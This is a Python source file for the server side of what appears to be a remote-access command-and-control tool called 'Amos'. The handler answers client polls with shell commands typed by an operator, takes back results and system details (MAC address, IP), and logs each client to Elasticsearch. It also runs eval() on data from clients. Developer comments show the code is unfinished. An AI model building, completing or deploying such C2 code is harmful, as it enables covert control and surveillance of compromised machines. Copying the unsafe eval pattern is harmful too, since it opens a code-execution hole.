from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import threading
from EsHandler import EsHandler
import time
import requests
import json


class MyHandler(BaseHTTPRequestHandler):


    connected_clients = {}  # Use a class variable to store connected clients with their unique IDs
    selected_client_ip = None  # Variable to store the selected client IP after using 'select' command
    input_ready = threading.Condition()  # Condition object for synchronizing input
    es_handler = None
    check_call_response = False




    @staticmethod
    def convert_text(text):
            RESET = "\033[0m"
            BOLD = "\033[1m"
            COLOR = "\u001b[36m" 
            return f"{BOLD}{COLOR}{text}{RESET}"



    # Don't print: 127.0.0.1 - - [22/Jun/2021 21:29:43] "POST / HTTP/1.1" 200
    def log_message(self, format, *args):
        pass


    ##this is where the problem is
    #you need to rewrite the get function to hold result sent to it in a variable

    #sends command to server
    def send_shell_command_to_client(self):
        # Use the input_ready condition to wait for user input from the shell interface
        with MyHandler.input_ready:
            MyHandler.input_ready.wait()

            self.wfile.write(MyHandler.shell_command.encode())

            

    def do_GET(self):
        if MyHandler.selected_client_ip is None:
            # If the selected client IP is None, handle the command locally (not sent to a client)
            client_ip = self.client_address[0]
            client_id = self.get_client_id(client_ip)

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.send_shell_command_to_client()

        else:
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.send_shell_command_to_client()



    def store_sys_info(self, client_data, client_ip):

        sys_info = client_data["rfile"][0]
        sys_info = eval(sys_info.replace("'", "\"")) # Convert the string to a Python dictionary
        sys_info.update({"ip": str(client_ip)}) #update ip fields with client IP
        mac_address = sys_info.get('mac-address')
        self.upate_or_store_client_info(mac_address, sys_info)

            


    def get_action_value(self, client_data):
        try:
            data_dict = json.loads(client_data['rfile'][0])
            action_value = data_dict.get("action")
            return action_value
        except Exception as e:
            #print(f"Error: {e}")
            return None



    def do_POST(self):
        client_ip = self.client_address[0]
        length = int(self.headers['Content-Length'])
        self.send_response(200)
        self.end_headers()

        # response data
        client_post = parse_qs(self.rfile.read(length).decode())
        # checks if the client is sending an action
        action = self.get_action_value(client_post)

        if action:
            print(f"Received action: {action}")
            # Perform actions based on the received action
            if action == "save_data":
                client_dict = json.loads(client_post['rfile'][0])
                data_value = client_dict.get("data", {})
                print("Data Value:" + str(data_value))
                data_value['ip'] = client_ip

                #check if client is present
                self.upate_or_store_client_info(data_value['mac-address'], data_value)

                
                

            else:
                print(f"Unknown action: {action}")

        #why is rfile used here?
        else:
            if "rfile" in client_post:
                # sys_info response
                if hasattr(MyHandler, 'shell_command') and MyHandler.shell_command == "sys_info":
                    self.store_sys_info(client_post, client_ip)

                # check call response
                elif hasattr(MyHandler, 'shell_command') and MyHandler.shell_command == "connected":
                    if str(client_post["rfile"][0]) == "active":
                        print("Client Response: Active")
                        self.check_call_response = True

                else:
                    print(str(client_post["rfile"][0]))



    def upate_or_store_client_info(self, mac_address, client_info):
        #check if client is present
        if MyHandler.es_handler.is_client_present(mac_address):
            MyHandler.es_handler.update_document(mac_address, client_info)
        else:
            MyHandler.es_handler.store_client_information(client_info)
       

 

    def get_client_id(self, client_ip):
        # Get the client ID based on the client's IP address
        if client_ip in MyHandler.connected_clients:
            return MyHandler.connected_clients[client_ip]
        else:
            # If the client is not in the connected_clients dictionary, generate a new ID
            new_client_id = len(MyHandler.connected_clients) + 1
            MyHandler.connected_clients[client_ip] = new_client_id
            return new_client_id



    def continuous_communication(self, client_ip):
        # Send the initial "sys_info" command to the client before starting the loop
        with MyHandler.input_ready:
            MyHandler.shell_command = "sys_info"
            MyHandler.input_ready.notify()

        print(f"Communicating with Client IP: {client_ip}")
        amos_text = self.convert_text(f"Amos (Client IP: {client_ip}): ")

        while True:
            command = input(f"{amos_text}").rstrip()
            if command.strip().lower() == 'exit':
                break

            # Store the shell command in the class variable and notify the server thread
            with MyHandler.input_ready:
                MyHandler.shell_command = command
                MyHandler.input_ready.notify()

            # Add a small delay to allow the server thread to process the command
            threading.Event().wait(0.1)



    #send check call command to client 
    def send_check_call_command(self, client_ip):
        # Set a timeout of 5 seconds
        timeout = 5  
        # Wait for the response from the client with a timeout
        start_time = time.time()
        response_received = False

        while not response_received and time.time() - start_time < timeout:
        
            # Send the "check call" command to the client
            with MyHandler.input_ready:
                MyHandler.shell_command = "connected"
                MyHandler.input_ready.notify()
                break

        return self.check_call_response



    def is_client_connected(self, client_ip, esHandler):
        try:
            resp = esHandler.es.search(index=esHandler.db_name, query={"match": {"ip": client_ip}})
            esHandler.tabulate_data(resp)

        except Exception as e:
            print(f"An error occurred: {e}")




    def get_client_ip(self, client_id, esHandler):
        try:
            resp = esHandler.es.get(index=esHandler.db_name, id=client_id)
            return resp["_source"]["ip"]

        except Exception as e:
            print(f"An error occurred: {e}")






